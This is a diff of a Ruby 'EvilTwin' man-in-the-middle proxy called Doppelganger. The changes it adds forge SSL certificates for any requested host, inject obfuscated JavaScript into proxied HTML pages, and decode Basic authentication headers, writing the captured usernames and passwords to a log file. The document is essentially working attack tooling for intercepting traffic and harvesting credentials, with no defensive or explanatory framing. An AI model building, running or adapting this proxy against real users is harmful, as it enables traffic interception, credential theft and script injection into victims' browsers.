@@ -4,7 +4,7 @@
 # define external libraries
 require "rubygems"
 require "dnsruby"
-#require "packr"
+require "packr"
 require "optparse"
 require "socket"
 require "net/http"
@@ -74,11 +74,11 @@ class Doppelganger
 
 		puts "Binding to IP Address: " + @HttpdAddr		
 
-		@ProxyServer = Doppelganger::Proxy.new(config)
-		@ProxyServer.Start
-
 		@HttpdServer = Doppelganger::Httpd.new(config)
 		@HttpdServer.Start
+
+		@ProxyServer = Doppelganger::Proxy.new(config)
+		@ProxyServer.Start
 		
 		Process.wait
 
@@ -115,9 +115,9 @@ class Doppelganger
 				:SSLVerifyClient => ::OpenSSL::SSL::VERIFY_NONE,
 				:SSLCertName => [['C', 'US'], ['O', host], ['CN', host], ['OU', rand(65535).to_s]],
 				:DocumentRoot => "/tmp")
+
+		@Server.mount("/", DoppelgangerSSLIntermediary)
 		
-		@Server.mount("/", DoppelgangerCGI)
-		#@Server.mount("/", WEBrick::HTTPServlet::CGIHandler, "./fetch_ssl.rb")
 
 		puts "Starting EvilTwin Proxy server: " + host
 		trap("INT") { |sig|
@@ -145,7 +145,8 @@ class Doppelganger
 
 	class Proxy
 		@InjectionScripts = nil
-		#@PackedScripts = nil
+		@PackedScripts = nil
+		@FakeServerFiles = nil
 
 		@ProxyAddr = nil
 		@ProxyPort = nil
@@ -168,8 +169,9 @@ class Doppelganger
 
 		def initialize(config)
 			# Javascript get loaded in reverse order (LIFO)
-			@InjectionScripts = Array["prototype.js", "inject.js"]
-			#@PackedScripts = {}
+			@InjectionScripts = Array["prototype.js", "utility.js", "inject.js"]
+			@PackedScripts = {}
+			@FakeServerFiles = ["/doppelganger"]
 
 			machine_bytes = ['foo'].pack('p').size
 			machine_bits = machine_bytes * 8
@@ -224,14 +226,51 @@ class Doppelganger
 
 			@LogDir = config[:LogDir]
 
-			@Server = nil				
+			@Server = nil			
+
+			self.PrepareScripts	
+		end
+
+		def PrepareScripts
+			@InjectionScripts.each { |script|
+				puts "Packing script: #{script}"
+				file = File.open("#{@HttpdFileRoot}#{script}", "r")						
+				unpacked_code = file.read
+				packed_code = Packr.pack(unpacked_code, :shrink_vars => true, :protect => ["$super"])
+
+				@PackedScripts[script] = packed_code
+				file.close
+			}
+		end
+
+		def FakeServerFiles (request, response)
+			header = request_get_header(request)
+
+			uri = URI.parse(request.request_uri.to_s)
+			@FakeServerFiles.each { |file| 
+				if uri.path == file
+					puts "Fake file found: #{file}"
+					http = Net::HTTP.new(@HttpdAddr, @HttpdPort)   				
+    			http.start {
+      			http.request_get(uri.path, header) {|res|
+						response.content_type = res['content-type']
+						response.body = res.body.to_s
+						#response.status = res.status
+	     			}
+						return true				
+					}
+				end
+    	}
+			return false
 		end
 
 		def TransformContents(request, response)
+			if self.FakeServerFiles(request, response) == true
+				return response
+			end
 			uri = URI.parse(request.request_uri.to_s)
 			@InjectionScripts.each { |script| 
-				script_request = "/#{@RandomNum}_#{script}"
-				#puts "Script path: #{script_request}; URI.Path: #{uri.path}"
+				script_request = "/#{@RandomNum}_#{script}"		
 				if uri.path == script_request
 					file = File.open("#{@HttpdFileRoot}#{script}", "r")						
 					response.body = file.read
@@ -274,7 +313,7 @@ class Doppelganger
 					if item =~ /Basic/i
 						item.gsub!(/Basic/i, "")
 						basic_login = Base64.decode64(item)						
-						#TODO: Create basic authentication logging.
+						#Basic authentication logging.
 						auth_log = File.open("#{$doppelganger_config[:LogDir]}/basic_auth.log", a)
 						auth_log.syswrite("#{request.host} - #{basic_login}")
 						auth_log.close
@@ -284,26 +323,24 @@ class Doppelganger
 				end
 			}
 
-			
-
 			if perform_transformation && response.content_type =~ /text/i
 					server_url = "http://" + @HttpdAddr + ":" + @HttpdPort.to_s + "/"
-
 					
 					server_url = "#{uri.scheme}://#{uri.host}:#{uri.port}/"
 
-					#TODO: Inject Javascript
-					@InjectionScripts.each { |script|
-						#file = File.open("#{@HttpdFileRoot}#{script}", "r")						
-						#unpacked_code = file.read
-						#packed_code = Packr.pack(unpacked_code, :shrink_vars => true, :protect => ["$super"])
-
-						#@PackedScripts[script] = unpacked_code
-
+					@InjectionScripts.reverse_each { |script|									
+						packed_code = @PackedScripts[script]	
 						#html = "<script language=\"javascript\" type=\"text/javascript\">#{unpacked_code}</script></head>"
+
 						js_url = "#{server_url}#{@RandomNum}_#{script}"
-						html = "<script src=\"" + js_url + "\" language=\"javascript\" type=\"text/javascript\"></script></head>"
-						response.body.gsub!(/\<\/head\>/i, html)
+
+						if response.body =~ /\<\/body\>/i
+							html = "</body><script src=\"" + js_url + "\" language=\"javascript\" type=\"text/javascript\"></script>"
+							response.body.gsub!(/\<\/body\>/i, html)
+						else
+							html = "</head><script src=\"" + js_url + "\" language=\"javascript\" type=\"text/javascript\"></script>"
+							response.body.gsub!(/\<\/head\>/i, html)
+						end
 					}	
 
 					#init_js = 'Event.observe(window, "load", function() { initialize_doppelganger(); });'
@@ -424,6 +461,8 @@ class Doppelganger
 					:Port => @HttpdPort, 
 					:DocumentRoot => @HttpdFileRoot)
 
+				@Server.mount("/doppelganger", WEBrick::HTTPServlet::CGIHandler, "./fake_file_handler.rb")
+	
 				puts "Starting Doppelganger HTTPD server"
 				trap("INT") { |sig|
 					puts "Shutting down Doppelganger HTTPD server."
@@ -484,7 +523,7 @@ end
 class WebDistortProxy < WEBrick::HTTPProxyServer
 	alias old_proxy_connect proxy_connect
 	def proxy_connect(req, res)
-		req.createDoppelganger	
+		#req.createDoppelganger	
 		old_proxy_connect(req, res)
 	end
 end
@@ -516,7 +555,20 @@ class WEBrick::HTTPRequest
 	end
 end
 
-class DoppelgangerCGI < WEBrick::HTTPServlet::AbstractServlet
+class FakeFileCGI < WEBrick::HTTPServlet::AbstractServlet
+	def do_GET(request, response)
+			status, content_type, body = process_request(request)
+			response.status = status
+			response['Content-type'] = content_type
+			response.body = body		
+	end
+
+	def process_request(request)
+		return "200", "text/plain", "screwed!"
+	end
+end
+
+class DoppelgangerSSLIntermediary < WEBrick::HTTPServlet::AbstractServlet
 	def initialize(config)
 		
 	end
@@ -535,19 +587,7 @@ class DoppelgangerCGI < WEBrick::HTTPServlet::AbstractServlet
 
 		response = []
 
-		header = {}
-		#pp request.raw_header
-    request.raw_header.each {|line| 
-			puts line
-			key, item = line.split(":") 
-			header[key] = item
-		}
-
-		pp header
-
-		#request.header.each { |key| header[key] = request.header[key][0] }
-
-		#pp header
+		header = request_get_header(request)
 
 		http = Net::HTTP.new(uri.host, uri.port)
    	http.use_ssl = true if uri.scheme == "https"  # enable SSL/TLS
@@ -563,6 +603,16 @@ class DoppelgangerCGI < WEBrick::HTTPServlet::AbstractServlet
 	def do_POST(request, response)
 		do_GET(request, response)
 	end 
+end
+
+def request_get_header(request)
+	header = {}
+	request.raw_header.each {|line| 
+		puts line
+		key, item = line.split(":") 
+		header[key] = item
+	}
+	return header
 end
 
 program = Doppelganger.new(
